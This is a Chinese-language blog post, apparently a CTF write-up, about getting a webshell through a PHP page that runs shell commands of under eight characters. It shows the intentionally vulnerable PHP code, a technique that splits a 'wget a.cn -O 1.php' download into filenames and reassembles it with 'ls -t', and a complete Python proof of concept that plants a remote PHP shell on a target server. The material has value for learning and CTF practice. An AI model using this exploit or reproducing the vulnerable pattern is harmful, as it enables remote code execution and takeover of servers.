---
title: 从七个字符长度的任意命令执行到GetShell
url: 524.html
id: 524
categories:
  - hack_ctf
date: 2017-02-09 19:00:07
tags:
  - php
  - ctf
---

看到phithon在圈子里发了个题，感觉好坑，记录一下我走过的套路：
此题的代码很简单，如下：
<!--more-->

```php
<?php
if(strlen($_GET[1])<8){
     echo shell_exec($_GET[1]);
}
?>
```
要求要getshell。
### 分析
1. 直接写shell是不可能的，因为 `1=echo 1>1` 都8个字符了，已经超了
2. 下载一个shell也是不可行的，`1=wget a.cn`也超了。

所以需要想其他的办法。
@yichin告诉我，直接`1=>filename`,就可以创建文件，但是`1=1>filename`并没有办法把1写到文件中去，所以说这里只能够创建空文件，没有办法把内容写入到文件中去。可以利用的就只有文件名了。
利用文件名是否可以getshell呢？？ 

刚想到这里，yichin说这样`1=ls >a`,能否有办法写入个shell呢?  这句话一下子惊醒我了，我顿时明白了这里面套路。
思路是这样的：
> 我们把一条长的命令拆分为多个小段，把每一段都存为文件名，然后用 `1=ls >a`,创建文件a，执行a来getshell。
但是有一个后遗症，就是你得想办法解决好多换行的问题，下面会详细说。

思路有了，接下来就是要动手啦，但是我却走了好多弯路，分别都说一下：
1. 开始我想把最短的shell，```<?=`$_GET[1]`;```拆分为多个段，每段都做为文件名，然后ls一下重定向到一个php文件，就getshell了。想法很美好，但是现实很残酷`1=ls >a.php`长度都已经超了，所以不能直接写php文件。
2. 所以接下来就是想写个sh文件，执行sh文件来getshell，但是sh文件到底写啥命令？     
是echo 一个shell到php文件，还是用wget下载一个shell呢。
经过我的测试 ，我发现echo一个shell貌似不行或者说很麻烦，搞了好久也没成功，主要是php语句换行的问题。
虽然php一条语句读到分号才算结束，中间可以有多个换行，换行不影响执行，但是换行也是都限度的，就是关键词是不可再拆分的,比如：
```php
<?`
$_GET[1]
`;
```
这是可以运行的，没有问题，但是如果在`$_GET[1]`中任意一个地方添加一个换行，都是没办法运行的
```php

<?`
$_GET
[1]
`;
//无法运行
```
也就是说，`$_GET[1]`是没办法再拆分的，必须是一个整体。但是长度显然是超了。
接下来就只有最后一个方法了，下载一个shell了。
经过多次测试，发现下面sh文件是可以运行的：
```bash
wget\
 a.\
cn \
-O \
1.php
```
目的是到a.cn下载一个文件保存为1.php,就getshell了。
所以接下来我只需要把这个sh文件的每一行都存为一个文件名,然后`ls >a`,`sh a`，就坐等shell了。
（**注意：a.cn需要换成你的域名，自己做拆分的时候需要注意一点，`.`不能放在文件名开头，因为以`.`开头的文件名是隐藏文件，ls是列不出来的）

最后还有一个问题，就是ls 列出来文件名是按照字符字典[a-z]的顺序排列的，不能得到我们想要的顺序，这时候想到了按照创建时间先后排序。
因为 `ls -tr>a`长度已经超了，所以只有用`ls -t>a`了。
`ls -t`列出来的文件顺序是:最后创建的文件在最前面，所以我们创建文件的时候要先创建最后一行`1.php`,最后创建文件`wget\`

给个python写的POC：
```python
#!/usr/bin/python
#-*- coding: utf-8 -*- 

import requests 
def GetShell():
    url = "http://192.168.56.129/shell.php?1="
    fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"] 
    # linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"
    # 可以修改hosts文件，让a.cn指向一个自己的服务器。
    # 在a.cn 的根目录下创建index.html ，内容是一个php shell 

    for fileName in fileNames:
        createFileUrl = url+">"+fileName
        print createFileUrl 
        requests.get(createFileUrl)
   
    getShUrl = url + "ls -t>1"
    print getShUrl
    requests.get(getShUrl)
    getShellUrl = url + "sh 1"
    print getShellUrl
    requests.get(getShellUrl)

    shellUrl = "http://192.168.56.129/1.php"
    response = requests.get(shellUrl)
    if response.status_code == 200:
        print "[*] Get shell !"
    else :
        print "[*] fail!"

if __name__ == "__main__":
    GetShell()
```